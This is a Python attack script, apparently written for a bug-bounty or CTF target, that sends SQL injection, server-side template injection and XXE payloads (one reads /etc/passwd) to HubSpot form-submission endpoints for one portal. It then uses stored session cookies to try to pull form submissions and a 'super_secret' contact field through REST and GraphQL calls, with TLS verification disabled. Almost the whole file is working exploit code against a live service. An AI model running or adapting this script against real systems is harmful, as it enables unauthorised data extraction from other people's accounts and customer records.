#!/usr/bin/env python3
"""
AGGRESSIVE form exploitation - try to extract data through form submissions
Test: data reflection, error messages, stored XSS retrieval, template injection
"""

import requests
import json
import os
from dotenv import load_dotenv
import urllib3
import time

urllib3.disable_warnings()
load_dotenv()

SESSION_COOKIES = os.getenv('HUBSPOT_COOKIES')
TARGET_PORTAL = '46962361'

print("="*80)
print("AGGRESSIVE FORM EXPLOITATION")
print("="*80)

findings = []

# The 9 public forms we found
form_ids = [1, 3, 4, 5, 6, 8, 13, 18, 1000]

for form_id in form_ids:
    print(f"\n{'='*80}")
    print(f"EXPLOITING FORM {form_id}")
    print("="*80)

    # ========================================================================
    # 1. TRY TO SUBMIT WITH MALICIOUS PAYLOADS TO TRIGGER ERROR MESSAGES
    # ========================================================================

    print(f"\n[*] Attempting to trigger error messages with data leakage...")

    submit_url = f'https://api.hsforms.com/submissions/v3/integration/submit/{TARGET_PORTAL}/{form_id}'

    # Payloads designed to trigger errors that might leak data
    error_payloads = [
        # SQL Injection to trigger error
        {
            'fields': [
                {'name': 'email', 'value': "test@test.com' OR 1=1--"},
                {'name': 'firstname', 'value': "' OR '1'='1"},
            ]
        },
        # Template injection
        {
            'fields': [
                {'name': 'email', 'value': '{{7*7}}@test.com'},
                {'name': 'firstname', 'value': '${7*7}'},
                {'name': 'lastname', 'value': '<%= 7*7 %>'},
            ]
        },
        # Try to access contact properties
        {
            'fields': [
                {'name': 'email', 'value': '{{contact.super_secret}}@test.com'},
                {'name': 'firstname', 'value': '{{contact.firstname}}'},
            ]
        },
        # SSTI (Server-Side Template Injection)
        {
            'fields': [
                {'name': 'email', 'value': '{{config.items()}}@test.com'},
                {'name': 'firstname', 'value': '{{request.application.__globals__}}'},
            ]
        },
        # XXE attempt
        {
            'fields': [
                {'name': 'email', 'value': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'},
            ]
        },
        # Try to reference existing contact
        {
            'fields': [
                {'name': 'email', 'value': 'contact1@portal46962361.com'},
                {'name': 'hs_object_id', 'value': '1'},
            ]
        },
        # Try super_secret field directly
        {
            'fields': [
                {'name': 'super_secret', 'value': 'test'},
                {'name': 'email', 'value': 'test@test.com'},
            ]
        },
        # Try to use contact merge tokens
        {
            'fields': [
                {'name': 'email', 'value': 'test@test.com'},
                {'name': 'message', 'value': '{{ contact.super_secret }}'},
            ]
        },
    ]

    for i, payload in enumerate(error_payloads, 1):
        try:
            print(f"\n  [Payload {i}] {json.dumps(payload)[:60]}...")

            r = requests.post(submit_url, json=payload, verify=False, timeout=10)

            print(f"    Status: {r.status_code}")

            if r.status_code not in [200, 404]:
                try:
                    error_data = r.json()
                    error_str = json.dumps(error_data)

                    print(f"    Response: {error_str[:300]}")

                    # Check for leaked data in errors
                    if any(term in error_str.lower() for term in ['firstname', 'super_secret', 'contact', 'portal', 'vid', 'property']):
                        print(f"\n    *** ERROR MESSAGE CONTAINS INTERESTING DATA! ***")
                        print(f"    Full response: {json.dumps(error_data, indent=2)}")

                        findings.append({
                            'form_id': form_id,
                            'type': 'error_message',
                            'payload': payload,
                            'response': error_data
                        })
                except:
                    print(f"    Response (text): {r.text[:300]}")

                    # Check text response
                    if 'firstname' in r.text.lower() or 'super_secret' in r.text.lower():
                        print(f"\n    *** TEXT RESPONSE CONTAINS DATA! ***")
                        print(f"    {r.text}")
        except Exception as e:
            print(f"    Error: {str(e)[:80]}")

    # ========================================================================
    # 2. TRY TO GET FORM SUBMISSION CONFIRMATION WITH DATA
    # ========================================================================

    print(f"\n[*] Checking form submission confirmations...")

    # Sometimes forms redirect to a thank-you page with submitted data
    payload = {
        'fields': [
            {'name': 'email', 'value': 'test@hackerone.com'},
            {'name': 'firstname', 'value': 'TestUser'},
        ]
    }

    try:
        r = requests.post(submit_url, json=payload, verify=False, timeout=10, allow_redirects=False)

        print(f"  Status: {r.status_code}")

        # Check for redirect
        if 'location' in r.headers:
            redirect_url = r.headers['location']
            print(f"  Redirect: {redirect_url}")

            # Follow redirect
            r2 = requests.get(redirect_url, verify=False, timeout=10)
            print(f"  Redirect page status: {r2.status_code}")

            if 'super_secret' in r2.text.lower() or 'firstname' in r2.text.lower():
                print(f"  *** REDIRECT PAGE CONTAINS DATA! ***")
                print(f"  {r2.text[:500]}")

        # Check response for confirmation message with data
        if r.status_code == 200:
            try:
                data = r.json()

                if 'inlineMessage' in data or 'redirectUrl' in data:
                    print(f"  Form response: {json.dumps(data, indent=2)[:300]}")
            except:
                pass
    except:
        pass

    # ========================================================================
    # 3. TRY TO RETRIEVE SUBMITTED DATA VIA API
    # ========================================================================

    print(f"\n[*] Attempting to retrieve form submissions...")

    # Try to get form submissions
    submission_urls = [
        f'https://api.hubapi.com/form-integrations/v1/submissions/forms/{TARGET_PORTAL}/{form_id}',
        f'https://api.hubapi.com/forms/v2/submissions/{TARGET_PORTAL}/{form_id}',
        f'https://app.hubspot.com/forms/{TARGET_PORTAL}/{form_id}/submissions',
    ]

    headers = {
        'Cookie': SESSION_COOKIES,
        'User-Agent': 'Mozilla/5.0',
    }

    for url in submission_urls:
        try:
            r = requests.get(url, headers=headers, verify=False, timeout=5)

            print(f"  GET {url[:70]}... -> {r.status_code}")

            if r.status_code == 200:
                print(f"  *** SUBMISSIONS ACCESSIBLE! ***")
                try:
                    data = r.json()
                    print(f"  {json.dumps(data, indent=2)[:500]}")

                    if 'super_secret' in json.dumps(data).lower():
                        print(f"\n  *** CONTAINS super_secret! ***")
                        findings.append({
                            'form_id': form_id,
                            'type': 'submission_data',
                            'url': url,
                            'data': data
                        })
                except:
                    print(f"  {r.text[:300]}")
        except:
            pass

    # ========================================================================
    # 4. TRY GRAPHQL IF FORM USES IT
    # ========================================================================

    print(f"\n[*] Checking for GraphQL endpoints...")

    graphql_url = 'https://api.hubapi.com/graphql'

    # Try to query form data
    graphql_queries = [
        {
            'query': f'''
                query {{
                    form(id: "{form_id}", portalId: {TARGET_PORTAL}) {{
                        id
                        name
                        submissions {{
                            values
                        }}
                    }}
                }}
            '''
        },
        {
            'query': f'''
                query {{
                    contact(id: 1) {{
                        properties {{
                            firstname
                            super_secret
                        }}
                    }}
                }}
            '''
        },
    ]

    for query in graphql_queries:
        try:
            r = requests.post(graphql_url, json=query, headers=headers, verify=False, timeout=5)

            if r.status_code == 200:
                print(f"  *** GRAPHQL RESPONSE! ***")
                try:
                    data = r.json()
                    print(f"  {json.dumps(data, indent=2)[:400]}")
                except:
                    print(f"  {r.text[:300]}")
        except:
            pass

print("\n" + "="*80)
print("AGGRESSIVE FORM EXPLOITATION COMPLETE")
print("="*80)

if findings:
    print(f"\n*** FOUND {len(findings)} POTENTIAL VULNERABILITIES! ***\n")

    with open('/home/user/Hub/findings/aggressive_form_findings.json', 'w') as f:
        json.dump(findings, f, indent=2)

    for finding in findings:
        print(f"\n{json.dumps(finding, indent=2)[:800]}")

        if 'super_secret' in json.dumps(finding).lower():
            print(f"\n*** POTENTIAL CTF FLAG! ***")
else:
    print("\nNo vulnerabilities found in forms.")
